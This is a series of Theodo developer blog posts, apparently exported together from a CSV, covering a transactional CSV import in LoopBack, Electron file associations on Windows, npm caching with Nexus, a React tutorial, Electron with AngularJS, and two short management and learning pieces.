The first challenge is to make a user friendly process. If a user uploads a file and the import fails, he needs to be able to know why and how to fix his file in order to try to import it again.
The second challenge is to keep the database in a consistent state: if the user imports a file that creates an error at the line 50, the first 49 lines should not be written in the database. You don’t want to write anything in the database if an error has risen in the process. A solution is to use SQL transactions to control when your changes to the database are eventually applied.
Lastly, in order to import large datasets without impacting the user experience, you need to separate the upload process (where the user is waiting for a few seconds for the file to be uploaded) from the import process which happens in the backend, maybe for a few minutes.

In this article, we will explain how to build your own transactional csv import using the node framework loopback and a relational database.
The process allows the user to know which cells of his excel file have failed and rollbacks if an error raises. We will demonstrate the process with the database PostgreSQL, but transactions can used with different connectors in Loopback.
I will also assume that you know the basics of the Loopback framework and coffeescript syntax. Let’s say we want to import invoices in our system and we already have an Invoice loopback model with two properties invoiceId and amount.
Start by creating an upload remote method in the Invoice model that will be called by your client app with a POST request.
common/models/Invoice.json
Invoice.upload = (req, callback) ->
  # wait for it
  callback()

Invoice.remoteMethod 'upload',
  accepts: [
    arg: 'req'
    type: 'object'
    http:
      source: 'req'
  ]
  http:
    verb: 'post'
    path: '/upload'


Add the following modules in your Invoice model:
_        = require 'lodash'
async    = require 'async'
csv      = require 'fast-csv'
fork     = require('child_process').fork
fs       = require 'fs'
path     = require 'path'
loopback = require 'loopback'

In order to separate the file upload and the data processing, we are going to store the file in the filesystem and save in the database the state of the upload (a PENDING status). As soon as the upload is done, we send a http answer to the client so that he can continue using the app while the data is processed.
Then we start a new node process using the module fork. It will call a custom import method described below.
Using the library fast-csv, we parse the csv file and begin a sql transaction.
We can now proceed to the import and commit the transaction if no error is raised. Otherwise the transaction is canceled and the import remains in the initial state, it is a all or nothing import process. Eventually we delete the file from the filesystem.
Before starting to code the upload method, we need to create a few more models.
Create a FileUpload and FileUploadError models that will be used to store the state of the imports (PENDING, SUCCESS, ERROR) and the error list.
A FileUpload has many FileUploadError, so let’s use the loopback hasManyrelation.

Create a model Container which will be used by the component loopback-component-storage to create a container. A container is similar to a directory and will be used to store the csv file uploaded by the user.
Update server/datasources.json to add the container datasource.
Create the tables related to the models in your database and don’t forget to declare your models in the server/model-config.json

WARNING: If you use PostgreSQL update the poolIdleTimeout property of your database.
Because we do not commit the changes to the database before the end of the process, PostgreSQL sees the connection as idle and raises a timeout error. Set the poolIdleTimeout to be above the maximum time a import should take.
server/datasources.json
{
  ""db"": {
    ... // Your config,
    ""poolIdleTimeout"": 1200000
  },
  ""container"": {
    ""name"": ""container"",
    ""connector"": ""loopback-component-storage"",
    ""provider"": ""filesystem"",
    ""root"": ""tmp""
  }
}


Create a tmp folder at the root of your projet that will be used to store the uploaded files.
Now we can start coding! Remember the import method I mentionned? Let’s implement it!
Start by installing the following dependencies: fast-csv, lodash,
async, loopback-component-storage
npm install fast-csv lodash async loopback-component-storage --save

The upload method initializes the import process:
  Invoice.upload = (req, callback) ->
    Container = Invoice.app.models.Container
    FileUpload = Invoice.app.models.FileUpload

    # Generate a unique name to the container
    containerName = ""invoice-#{Math.round(Date.now())}-#{Math.round(Math.random() * 1000)}""

    # async.waterfall is like a waterfall of functions applied one after the other
    async.waterfall [
      (done) ->
        # Create the container (the directory where the file will be stored)
        Container.createContainer name: containerName, done
      (container, done) ->
        req.params.container = containerName
        # Upload one or more files into the specified container. The request body must use multipart/form-data which the file input type for HTML uses.
        Container.upload req, {}, done
      (fileContainer, done) ->

        # Store the state of the import process in the database
        FileUpload.create
          date: new Date()
          fileType: Invoice.modelName
          status: 'PENDING'
        , (err, fileUpload) ->
          return done err, fileContainer, fileUpload
    ], (err, fileContainer, fileUpload) ->
      return callback err if err
      params =
        fileUpload: fileUpload.id
        root: Invoice.app.datasources.container.settings.root
        container: fileContainer.files.file[0].container
        file: fileContainer.files.file[0].name

      # Launch a fork node process that will handle the import
      fork __dirname + '/../../server/scripts/import-invoices.coffee', [
        JSON.stringify params
      ]
      callback null, fileContainer

Create a scripts folder in server and add an import-invoices.coffee file. This script is used to lauch a forked node process calling an import method of the Invoice model. It exits to make sure that the node process is killed when an import is over.
Content of the import-invoices.coffee file:
server = require '../server.coffee'
options = JSON.parse process.argv[2]

# Make sure that the node process is killed when the import process is over.
try
  server.models.Invoice.import options.container, options.file, options, (err) ->
    process.exit if err then 1 else 0
catch err
  process.exit if err then 1 else 0

Let’s dive into the import method. It first calls a import_preprocess method that initializes the SQL transaction.
Then it uses the method import_process and commits or rollbacks if there was an error.
import_postprocess_success and import_postprocess_error save the FileUpload status depending of the status of the import process.
import_clean destroys the uploaded file.
  Invoice.import = (container, file, options, callback) ->
    # Initialize a context object that will hold the transaction
    ctx = {}

    # The import_preprocess is used to initialize the sql transaction
    Invoice.import_preprocess ctx, container, file, options, (err) ->
      Invoice.import_process ctx, container, file, options, (importError) ->
        if importError
          # rollback does not apply the transaction
          async.waterfall [
            (done) ->
              ctx.transaction.rollback done
            (done) ->
              # Do some other stuff to clean and acknowledge the end of the import
              Invoice.import_postprocess_error ctx, container, file, options, done
            (done) ->
              Invoice.import_clean ctx, container, file, options, done
          ], ->
            return callback importError

        else
          async.waterfall [
            (done) ->
              # The commit applies the changes to the database
              ctx.transaction.commit done
            (done) ->
               # Do some other stuff to clean and acknowledge the end of the import
              Invoice.import_postprocess_success ctx, container, file, options, done
            (done) ->
              Invoice.import_clean ctx, container, file, options, done
          ], ->
            return callback null


  Invoice.import_preprocess = (ctx, container, file, options, callback) ->

    # initialize the SQL transaction
    Invoice.beginTransaction
      isolationLevel: Invoice.Transaction.READ_UNCOMMITTED
    , (err, transaction) ->
      ctx.transaction = transaction
      return callback err

In the import_process method, we iterate over each line of the csv file and apply the import_handleLine method that holds the business logic. This is were you will define what to do with your data.
  Invoice.import_process = (ctx, container, file, options, callback) ->
    fileContent = []
    filename = path.join Invoice.app.datasources.container.settings.root, container, file

    # Here we fix the delimiter of the csv file to semicolon. You can change it or make it a parameter of the import.
    stream = csv
      delimiter: ';'
      headers: true
    stream.on 'data', (data) ->
      fileContent.push data
    stream.on 'end', ->
      errors = []

      # Iterate over every line of the file
      async.mapSeries [0..fileContent.length], (i, done) ->
        return done() if not fileContent[i]?

        #  Import the individual line
        Invoice.import_handleLine ctx, fileContent[i], options, (err) ->
          if err
            errors.push err
            # If an error is raised on a particular line, store it with the FileUploadError model
            # i + 2 is the real excel user-friendly index of the line
            Invoice.app.models.FileUploadError.create
              line: i + 2
              message: err.message
              fileUploadId: options.fileUpload
            , done null
          else
            done()
      , ->
        return callback errors if errors.length > 0
        return callback()
    fs.createReadStream(filename).pipe stream

Using the next two methods, I save the status of the import in the database. You can use those two methods to add more business logic, for example send a confirmation email.
  Invoice.import_postprocess_success = (ctx, container, file, options, callback) ->
    Invoice.app.models.FileUpload.findById options.fileUpload, (err, fileUpload) ->
      return callback err if err
      fileUpload.status = 'SUCCESS'
      fileUpload.save callback

  Invoice.import_postprocess_error = (ctx, container, file, options, callback) ->
    Invoice.app.models.FileUpload.findById options.fileUpload, (err, fileUpload) ->
      return callback err if err
      fileUpload.status = 'ERROR'
      fileUpload.save callback

When the process is over, there is no need to keep the file, so let’s destroy the container to delete the file:
  Invoice.import_clean = (ctx, container, file, options, callback) ->
    Invoice.app.models.Container.destroyContainer container, callback

import_handleLine holds the business logic:

Checking the validity of the data in each cell
Creating or updating data on any model

  LineHandler =
    # Method to creadte/update the invoice from the data of the line
    createInvoice: (req, line, done) ->
      Invoice.findOne
        where:
          invoiceId: line.InvoiceId
      , req, (error, found) ->
        return done error if error

        invoice =
          invoiceId: line.InvoiceId
          amount: line.Amount
        invoice.id = invoice.id if found

        Invoice.upsert invoice, req, (error, invoice) ->
          if error
            done error, line.InvoiceId
          else
            done null, invoice

    rejectLine: (columnName, cellData, customErrorMessage, callback) ->
      err = new Error ""Unprocessable entity in column #{columnName} where data = #{cellData}: #{customErrorMessage}""
      err.status = 422
      callback err

    # Do all the necessary checks to avoid SQL errors and check data integrity
    validate: (line, callback) ->
      if line.InvoiceId is ''
        return @rejectLine 'InvoiceId', line.InvoiceId, 'Missing InvoiceId', callback
      if _.isNaN parseInt line.InvoiceId
        return @rejectLine 'InvoiceId', line.InvoiceId, 'InvoiceId in not a number', callback
      if line.Amount is ''
        return @rejectLine 'Amount', line.Amount, 'Missing Amount', callback
      if _.isNaN parseInt line.Amount
        return @rejectLine 'Amount', line.Amount, 'Amount in not a number', callback
      callback()

Conclusion
You are now able to build your own csv import!
In your client app, you can add an html input field with a file type. To display the status of the upload, you can poll every few seconds the FileUpload model. Check this cool article on how to make the user wait during a load!
If the import status is ERROR, you can get the error list using the FileUploadError model routes and make a nice UI.
A next step could be to add hints on how to fix the errors in the csv file in the FileUploadError model using the rejectLine method. We did it on one model but could extend it to multiple models by creating a mixin!
A fully functionnal example of this example is available on github. Take a look at other cool resources for Loopback on J. Drouet github who also worked on this import process!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Ricateau Pasquino
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Repetition is critical for learning. This article: http://lifeinthefastlane.com/learning-by-spaced-repetition/ outlines how the ideal repetition period is 1 day, 10 days, 1 month, and 3 months after initially learning something to ensure that you remember it. Therefore, when you have something very important to learn (like this 😉 ) , email it to yourself, and set a Boomerang for 1 day ahead, then when it comes back, set it for 10 days, then 1 month, then 3 months. 

Using boomerang is a neat trick for this, but the underlying principle is deeper: just because people have done something once, does not mean that they will remember it.


There are two ways this repetitive learning principle using Boomerang can be used:


To help everyone adopt new standards across Theodo. When a new standard is instituted, it is important that everyone uses it. Therefore, when a new standard comes into use, for example: “everyone must wear a christmas jumper in December”, if an email is sent to people a day after the standard is agreed upon, 10 days after, a month after and 3 months after, and everyone responds with “yes, I am doing this”,  then it is much, much more likely that people will remember how to do it.


To help new people learn Theodo standards. When you have a new coachee, you could make sure they have learned a particular standard by following up with them 1 day, 10 days, 1 month and three months later.


I hope you find this to be a useful trick!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sam Parlett
  			
  				  			
  		
    
			

									"
"
										
Following our introduction to the Electron framework and our demo using Angular with Electron, the Electron experience continues!
In this article dedicated to the Windows platform, we will expand on how to associate a file extension to your Electron application and how to import a data store from a file after double-clicking on it.
How to set file associations to your Electron app on Windows
Previously, we have explained how to build an app for a Windows platform with electron-builder.
To define your own file association using the same builder tool, you must create a custom NSIS installation script following the steps below.
Reminder: Nullsoft Scriptable Install System (NSIS) is a script-driven Installer authoring tool for Microsoft Windows.
First, copy the Electron builder’s one installer.nsi.tpl and include the file association script - FileAssociation.nsh from http://nsis.sourceforge.net
Here is our folder tree:
myapp
└── nsi-template
    ├── include
    │   └── FileAssociation.nsh
    └── installer.nsi.tpl

Then, copy the default Electron Builder’s installer.nsi.tpl in your template and add the lines below:
# modification: add file association script
# projectNsiTemplateDir is replaced by a gulp task: nsi-template
########
!addincludedir ""@projectNsiTemplateDir""
!include ""FileAssociation.nsh""
########

...
# default section start
Section
 ...
  # modification: define file association
  ########
  ${registerExtension} ""$INSTDIR\${APP_NAME}.exe"" ""@projectExtension"" ""@projectFileType""
  ########
...

You can directly replace @projectNsiTemplateDir (absolute path), @projectExtension and @projectFileType by your own params or use the gulp task below:
var constant = {
    cwd: process.env.INIT_CWD || '',
    nsiTemplate: './nsi-template/include/',
    fileAssociation: {
        extension: '.myapp',
        fileType: 'My Awesome App File'
    }
};

// task to generate nsi-template for windows
gulp.task('nsi-template', function () {
    var projectIncludeDir = path.join(constant.cwd, constant.nsiTemplate);
    return gulp.src('nsi-template/installer.nsi.tpl')
        .pipe(replace('@projectNsiTemplateDir', projectIncludeDir))
        .pipe(replace('@projectExtension', constant.fileAssociation.extension))
        .pipe(replace('@projectFileType', constant.fileAssociation.fileType))
        .pipe(gulp.dest('dist/nsi-template/win'));
});

This task requires gulp and gulp-replace node modules.
Then, you have to update the electron builder config:
  ""win"" : {
    ""title"" : ""my-awesome-app"",
    ""icon"" : ""assets/win/icon.ico"",
    ""nsiTemplate"" : ""dist/nsi-template/win/installer.nsi.tpl""
  }

Here is the result:

Linking custom extensions with Electron for Windows should be natively available in electron-builder soon, so stay tuned.
How to configure your app to open linked files in Windows
On Windows, you have to parse process.argv to get the filepath.
Then, you can use the ipc module to handle messages from the renderer process (web page) and retrieve a data store from a file.
This is how we did it:
In the main process:
var ipc = require('ipc');
var fs = require('fs');

// read the file and send data to the render process
ipc.on('get-file-data', function(event) {
  var data = null;
  if (process.platform == 'win32' && process.argv.length >= 2) {
    var openFilePath = process.argv[1];
    data = fs.readFileSync(openFilePath, 'utf-8');
  }
  event.returnValue = data;
});

In the renderer process:
<script>
  // we use ipc to communicate with the main process
  var ipc = require('ipc');
  var data = ipc.sendSync('get-file-data');
  if (data ===  null) {
    document.write(""There is no file"");
  } else {
    document.write(data);
  }
</script>

Here is the result:

Conclusion
Congratulations! Now you know how to associate a file extension to your Electron application.
If this article interested you and you want to see more of Electron in action, check out our electron-boilerplate repository.
One more thing, the next article about Electron is coming up soon so stick around!
 
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Tristan Pouliquen
  			
  				Fullstack Web developer at Theodo, and curious about any new technology!  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Vincent Quagliaro
  			
  				Fullstack Web developer at Theodo  			
  		
    
			

									"
"
										Remember the last time you ran the npm install command, and you had time to grab three coffees, learn Russian and read Dostoievski before you could do anything productive?
During the installation of a node app, the npm install step is doubtless the most time consuming one. Assuming your network is somehow slow it can be endless… It’s inefficient because this command will download packages that you might have already downloaded tens of times for this app or another.
The npm cache already saves approximately 30% of the installation time: when packages are in the npm cache, the initial metadata request sends the cached ETag for the package, and in the vast majority of cases, the registry will return a 304 and the package tarball won’t need to be downloaded again. However, the number of HTTP requests is still the same so there is some time that can still be saved.
Although I do recognize the social gain of taking a coffee break with your teammates, I will tell you how to avoid taking a coffee each time you run npm install thanks to Nexus!
Nexus
Nexus is a a repository manager developed by Sonatype. In other words it can simulate the npm registry on your host. It supports other repositories such as RPM, Maven, Docker Registry…
Install Nexus
The simplest way to use Nexus is to pull the official Docker image.

docker run -d --name nexus-data sonatype/nexus
docker run -d -p 8081:8081 --name nexus --volumes-from nexus-data sonatype/nexus

It can take some time (2-3 minutes) for the service to launch in a new container. You can tail the log to determine once Nexus is ready:

docker logs -f nexus

Otherwise following the official installation guide would take approximately 30 minutes.
Here are the main steps for ubuntu 15.10 (easily adaptable for other OS):

# install Java 8 JRE
sudo add-apt-repository ppa:webupd8team/java
sudo apt-get update
sudo apt-get install oracle-java8-installer

# Download Nexus archive
sudo mkdir -p /opt/sonatype
sudo wget http://download.sonatype.com/nexus/oss/nexus-installer-3.0.0-m6-unix-archive.tar.gz /opt/sonatype
sudo tar xvzf nexus-installer-3.0.0-m6-unix-archive.tar.gz --directory /opt/sonatype && rm nexus-installer-3.0.0-m6-unix-archive.tar.gz
sudo ln -s /opt/sonatype/nexus-3.0.0-b2015110601 /opt/sonatype/nexus

# Launch the Nexus server:
/opt/sonatype/nexus/bin/nexus run

Then you can access the web interface here: http://localhost:8081/
Set up the Nexus server
The next steps are based on Nexus guide for npm.
this video shows how to do the steps below!

Log in as ‘admin’ with the default password ‘admin123’ (you should change it as explained in the post install checklist)
Create a npmjs proxy:

Create a new repository: Parameters > Repositories > Create repository
Select “npm proxy” (the “npm hosted” allow to store private packages and is not in the scope of this article)
Fill the form (name: “npm-proxy”, remote storage: “https://registry.npmjs.org” check “Use the Nexus truststore”, select “default” for the blobstore) and click on “create repository”


Create a repository group

Then create a new repository “npm group”
I named it “npm” and fill the simple form including the repository you just created



Tell npm to hit the Nexus repository
In ~/.npmrc file, replace the line by:

# add the URL of the repository
registry = http://localhost:8081/content/groups/npm/

Now try to install a package. Then you’ll find it in the list of components in the nexus npm repository. You can disconnect from the Internet, remove your node modules and re-install. Voilà!
Unfortunately the official docker image does not provide the version 3 of Nexus so you cannot browse the npm packages.
Bonus: configure your local repository as a service
To avoid starting the nexus server each time you reboot, you can configure nexus as a service that will start during the boot phase.
If you’re using a docker image, you’ll just have to use the --restart=always option in your run commands.
Otherwise, the Nexus guide explain how to do it but it is not simple and the doc is not up to date (this is actually the reason why I started using Docker).
Alternatives
There are alternatives to Nexus to cache npm packages. Here are two interesting ones:

npm-cache wraps npm and includes cache utilities but it breaks the standard way to install node apps. Who expects to run npm-cache install instead of npm install to install a node app?
npm-proxy-cache is a simple node app doing the same job as Nexus but I don’t like the fact it’s not a formal registry (have you used it? Your feedback would be great).

Conclusion
Using Nexus saves approximately 30% of the installation time of packages already in the npm cache.
This is one of the many use cases of Nexus. You can easily set up this tool to store private packages and thus improve your installation process. This tool can be useful for companies with security concerns that do not want to access the Internet during the installation process.
So install Nexus but don’t forget to heavily test your app to run npm test and get another excuse to take a coffee break with your teammates!
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

	
				

													

										
										
										

										
										
									
									
				
				

				
				

				
				

				
				 Submit				
				
			
			

			
	

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Girault
  			
  				Nicolas is a web developer eager to create value for trustworthy businesses.
Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
			

									"
"
										There are relatively few books which I have found valuable enough to re-read, and “High Output Management”, by Andy Grove, the ex-president of Intel, is one of them. It is my objective in this article to get one Theodoer to read this book. So if you do, please let me know!
In order to encourage you to read the book, here I outline 3 points from it that you may find interesting:
Choose the right type of indicator! 
Grove talks about the importance of choosing the right indicators, two types of which, I outline below:

Gated indicators, where a process is not continued until quality standards are met. You absolutely do not continue until a problem is resolved, compared to a process indicator, where you measure that something is wrong, but you continue going as you were, with some minor changes.
Paired indicators, where there is both a maximum and a minimum indicator to keep stock at an optimum. This a very lean mentality, do not always presume more is better: do what needs to be done and no more.

Motivate before training! 
Grove notes that training is only effective to the degree that people are motivated, so motivate first and provide training second. He points out that self-actualisation, or “what I can be, I must be”, is the highest form of motivation, and he believes this to be underpinned by either being competence (process) or achievement (outcome) driven.
Coach people as individuals! 
Grove argues strongly for regular scheduled one to ones between coach and coachee. He argues that they produce a totally different type of interaction that a casual phone call and are important to address big issues and to improve the output of the coachee. He also points out that coaching should  be different depending on the task-relevant maturity of the coachee:

low maturity, requires that the coach dictates tasks, explaining what, when, and how
medium maturity, requires two way support and guidance
high maturity, requires establishment of objectives and monitoring

Would I recommend this book? Yes, absolutely. 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sam Parlett
  			
  				  			
  		
    
			

									"
"
										What is React?
According to its developers, React is a JavaScript library for creating user interfaces. It is designed to solve one problem: building large applications with data that changes over time. It has had an ultra-fast success lately and is used in many famous websites like Facebook, Instagram, Netflix, AirBnb, BBC, Dailymotion, Deezer, Docker, Dropbox, IMDb, Paypal, Reddit, WhatsApp, Yahoo and many more.
That’s a nice piece of information but it does not answer the questions a programmer would ask himself in the first place: when should I use this library? Why is it better than others, and why should I change? What are the buisness benefits of using it? Is it easy to learn? Is it easy or fast to use?
Sadly, most of these questions should be answered by personal experience: try and you’ll see. What we can do here however, is to take a look at the library and then try to understand the trend it has had lately.
So, to introduce React, the best description is: It is a view layer.
Only a view layer.
Basicaly, React is made to build “components”, a number of functions, variables with a template, bundled together into a self-contained, independent, reusable brick that renders into HTML with all the javascript necessary for the user interactions. For those who are used to deal with Angular 1.x, React components are comparable to directives in many ways. This last point is the reason why full MVC frameworks like Angular or Backbone can not be compared with React. React is only made to build views, not to handle the rest of the logic necessary in a complete front-end app, for instance making calls to a server, sharing data between components or emiting/receiving application-wide events.
The answer given by Facebook to have this logic around React, is a Pattern calld Flux, which will be the subject of another post.
How do I use React?
React key concepts are props and state, they are two attributes present in every component and contain particular data. On the one hand, props are data passed from the outside. Every time the props change a rendering of the component is triggered (but the component is not reinitialized). On the other hand, the state is where the variables that define the status of the component are stored. They can be updated from within the component with the setState method, also present in every component, which updates the state and re-renders the component
But no more awaiting, let’s make a component to see the key features of the library: an orderable and interactive column of cards!
To bootstrap the project, we will use webpack (React works extremely well with webpack’s CommonJS system). Here is the package.json:
// package.json
{
  ""dependencies"": {
    ""babel-core"": ""6.4.5"",
    ""babel-loader"": ""6.2.1"",
    ""babel-preset-es2015"": ""6.3.13"",
    ""babel-preset-react"": ""6.3.13"",
    ""react"": ""0.14.7"",
    ""react-dom"": ""0.14.7"",
    ""webpack"": ""1.12.12"",
    ""webpack-dev-server"": ""1.14.1""
  },
  ""babel"": {
    ""presets"": [
      ""es2015"",
      ""react""
    ]
  }
}

The tree will look like this:
webpack.config.js
package.json
.
├─ src/
│   ├── app.jsx
│   ├── cardList.jsx
│   └── card.jsx
└─ www/
    └── index.html

Wait, what?! app.jsx? What is JSX?
JSX is a templating language used in the rendering functions of React components, it enables to have an XML-like formatting that makes really easy to see how the component will render. It is transpiled into vanilla javascript to be executed in a browser: for instance, return <div><div> will become return React.createElement('div'). It is possible to use make components with only javascript but the code is much more dense and wordy. More information about the JSX specs here.
So, webpack will be configured to transpile our components into javascript before making our bundle. The config file will be like this:
// webpack.config.js
var path = require(""path"");

module.exports = {
  entry: ""./src/app.jsx"",
  output: {
      path: path.join(__dirname, ""www""),
      filename: ""bundle.js"",
  },
  devtool: ""inline-source-map"",
  module: {
    loaders: [
      {
        test: /\.jsx?$/,
        exclude: /(node_modules|bower_components)/,
        loader: ""babel"",
      },
    ]
  },
  resolve: {
    extensions: ["""", "".js"", "".jsx""],
  },
  devServer: {
    contentBase: ""www/"",
    inline: true,
    colors: true,
    progress: true,
  }
};

An index.html needs to be put in the www/ directory to fetch the static data like the bundle.js file:
<!-- www/index.html-->
<!DOCTYPE html>
<html>
  <head>
    <meta charset=""UTF-8"" />
    <title>Hello React</title>
  </head>
  <body>
    <div id=""baseElement""></div>
    <script src=""/bundle.js""></script>
  </body>
</html>

Now the app.jsx is the entry point of our configuration, it will import all our dependencies (React also works extremely well with es6):
// src/app.jsx
import React from 'react'
import ReactDOM from 'react-dom'

import CardList from './cardList.jsx'

let cards = [
    {'name': 'Super card', 'id': 1},
    {'name': 'Other card', 'id': 2},
    {'name': 'Last card', 'id': 3}
];

ReactDOM.render(<CardList cards={cards} />, document.getElementById(""baseElement""))

The interesting part is this last line: ReactDOM is a sub-library of React wich is only aimed at attaching a component to a part of the current DOM and rendering the component. It also have a serverside counterpart that can be used to pre-render components directly in the server, but we will see that later.
Now that our app is all ready to be started, let’s start the React stuff. Here is a simple version of our cardlist component:
// src/cardList.jsx
import React from 'react'

class CardList extends React.Component {
    render() {
        let elements = this.props.cards.map((element) => {
            return (<li key={element.id}>{element.name}</li>)
        })
        return <ul>{elements}</ul>
    }
}

export default CardList


Let’s start a webpack-dev-server to see how that renders:

<div id=""baseElement"">
    <ul data-reactid="".0"">
        <li data-reactid="".0.0"">Super card</li>
        <li data-reactid="".0.1"">Other card</li>
        <li data-reactid="".0.2"">Last card</li>
    </ul>
</div>

Such list, very templating, wow!
By what kind of sorcery is all that working? Well first, we extended here a base Class of React that builds components. And what about this render() method? It is a method required in each component that is called every time the components needs to be processed into HTML and subsequent Javascript. In there we create an array of <li>s, each containing a card title. We can point out that variables have to be put inside brackets {}. Finally, we put this array in a <ul> element, and React will render all contained elements one after the other.
Also, there are a lot of data-reactids, they are attributes necessary for the core of the library, and they should not be touched by any piece of the application, not even for styling!
Here we go, we have a list of all our card names in a bullet list!
But we talked about some state earlier, why is it not used? Well this component is very simple, it is only a function to render some data, no user interaction will edit the apparence. A component like this is dumb in two ways: in its way of working, but also because using React for a component simple like this is. What we need is some user interaction ! We will enable the user to choose the order of the cards by adding some up/down arrows to move up or down cards.
So, the component will start by copying the list of cards of the props into the state by editing the component to look like this:
    constructor(props){
        super(props)
        this.state = props
    }
    render() {
        let elements = this.state.cards.map((element) => {
            return (<li key={element.id}>{element.name}</li>)
        })
        return <ul>{elements}</ul>
    }

This is necessary if we want to edit the data, since the props are immutable. Now, if we edit the state, the rendering will be affected accordingly.
We will now add a function to change the order of a particular card:
    moveCard(from, to){
        cards = this.state.cards
        movedCard = cards.splice(from, 1)
        cards.splice(to, 0, movedCard)
        this.setState({
            cards: cards
        })
    }

The beginning of this function is pretty straightforward, we copy the list and change the order of a particular item. The major concept to remember is the this.setState. This function is the only way that should be used to edit the state. It replace the items given in arguments, and triggers a render() to apply the modification to the DOM.
We need to bind the arrows onclick events with moveCard. The rendering function will then look like:
    render() {
        let elements = this.state.cards.map((element, index) => {
            return (
                <li key={index}>
                    {element.name}
                    <span onClick={() => this.moveCard(index, index-1)}>Up</span>
                    <span onClick={() => this.moveCard(index, index+1)}>Down</span>
                </li>
            )
        })
        return <ul>{elements}</ul>
    }

Notice that the onClick syntax is different from the html standard onclick. The reason is that React uses a cross-browser type of event, with the same methods on all browsers. The list of available events and further information can be found here
Another special attribute is className that computes into the basic HTML class. This is mandatory to handle the styling.
And if we look at the browser, it works! Only thing, there is a down arrow even on the last card, and an up arrow on the first card. Clicking them make the javascript crash. We will then add some conditions:
    render() {
        let elements = this.state.cards.map((element, index) => {
            return (
                <li key={index}>
                    {element.name}
                    {
                        index != 0 ? <span onClick={() => this.moveCard(index, index-1)}>Up</span> : ''
                    }
                    {
                        index != this.state.cards.length -1 ? <span onClick={() => this.moveCard(index, index+1)}>Down</span> : ''
                    }
                </li>
            )
        })
        return <ul>{elements}</ul>
    }

React does not have a ng-if-like function to have conditionnal elements, here is the reason with some examples to have the right behavior.
React is made to have as small components as possible, let’s cut this big component to simplify all this. The new component will look like this:
The final cardList is:
// src/cardList.jsx
import React from 'react'
import Card from './card'

class CardList extends React.Component {
    constructor(props){
        super(props)
        this.state = props
    }
    moveCard(fromIndex, toIndex) {
        let cards = this.state.cards
        let movedCard = cards.splice(fromIndex, 1)[0]
        cards.splice(toIndex, 0, movedCard)
        this.setState({
            cards: cards
        })
    }
    render() {
        let elements = this.state.cards.map((element, index) => {
            let moveUp, moveDown;
            if (index != 0)
                moveUp = this.moveCard.bind(this, index, index-1)
            if (index != this.props.cards.length - 1)
                moveDown = this.moveCard.bind(this, index, index+1)
            return (
                <Card
                    key={index}
                    card={element}
                    moveUp={moveUp}
                    moveDown={moveDown}
                />
            )
        })
        return <ul>{elements}</ul>
    }
}

export default CardList

And our new card is:
// src/card.jsx
import React from 'react'

class Card extends React.Component {
    render() {
        return (
            <li>
                {this.props.card.name}
                {
                    this.props.moveUp ? <span onClick={this.props.moveUp}> Up</span> : ''
                }
                {
                    this.props.moveDown ? <span onClick={this.props.moveDown}> Down</span> : ''
                }
            </li>
        )
    }
}

export default Card

Our component is now quite advanced, we could also add a lot of sugar around it, like adding an <input /> to add some new cards, or adding some styling around this basic HTML-only component.
And… That’s it!
Well, that’s it for the first chapter on the React and Flux serie. Now that we have the bases to build React components, we will use them to create a complex multi-component system to integrate in a real page.
I hope this litle tutorial could help you understand React better. If you liked this, keep up to date for the oncoming second part about the Flux architecture.
More to read about the subject can be found here:

React developer tools, a must have to work on components: https://chrome.google.com/webstore/detail/react-developer-tools/fmkadmapgofadopljbjfkapdkoienihi?hl=en
React’s documentation: https://facebook.github.io/react/docs/getting-started.html
A very good article that also explains React basics: http://blog.andrewray.me/reactjs-for-stupid-people/
The ES2015 specifications: http://babeljs.io/docs/learn-es2015/
A good setup of webpack to work with React: https://robots.thoughtbot.com/setting-up-webpack-for-react-and-hot-module-replacement


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Corentin de Boisset
  			
  				  			
  		
    
			

									"
"
										Following our introduction to the Electron framework, this article wants to give you the tools to develop and serve a real, complex application to your users, regardless of their platform.
To illustrate this article, we enriched our electron-boilerplate repository. You can checkout the electron-with-angular branch to see how we put in place AngularJS on our project.

Context of the project
Here at Theodo, we specialise in delivering apps and websites to our clients using the latest web technologies. So, when a former client came back to us with a project of an offline Windows application, this seemed far from our zone of expertise. However, we were able to put our skills to work to answer his needs with the help of Electron.
If you have never heard of it, you might want to read our previous article or follow the Quick Start Guide on the official website. In short, this framework allows you to serve web contents to your users in a desktop application. The best known example is Github’s IDE : Atom.
As soon as our development environment is set up with Electron, we can get back to better-known grounds such as AngularJS.
Cleanig up our folder structure
If you have read our previous article, you might have noticed where and how Electron launches your app. Everything takes place in the main.js script that runs your main process.
More exactly, all the magic happens with this particular line:
mainWindow.loadUrl('file://' + __dirname + '/index.html');

The loadUrl function takes the URL of your app’s entry point file to render it in your mainWindow process.
The example above corresponds to the Electron minimal app given in their “Quick Start” tutorial, with the folder structure being:
your-app/
├── package.json
├── main.js
└── index.html

For any project, you can expect files to multiply quite a bit and it is important to keep our workspace clean and logical throughout the lifespan of the project.
To do so, we decided to add a folder where all our code would go:
your-app/
├── client/
    └── index.html
├── package.json
├── main.js

To keep our app running, we had one change to make to the former configuration. It was to tell it where to look for our index.html now that we had moved it!
mainWindow.loadUrl('file://' + __dirname + '/client/index.html');

Using AngularJS with Electron
In this section, we explain our choice of using AngularJS alongside Electron. This is not an obligation, and you are free to code your app in anyway you want, provided you tell Electron where to look for your index.html file.
The fact that Electron needs a single file as an entry point to your app turned us quickly towards the AngularJS framework. Indeed, with Angular, everything starts at with the index.html file of your app.
From this point onward, we only had to work on building a functional Angular app answering our client’s needs. Much closer to our core business wouldn’t you say?
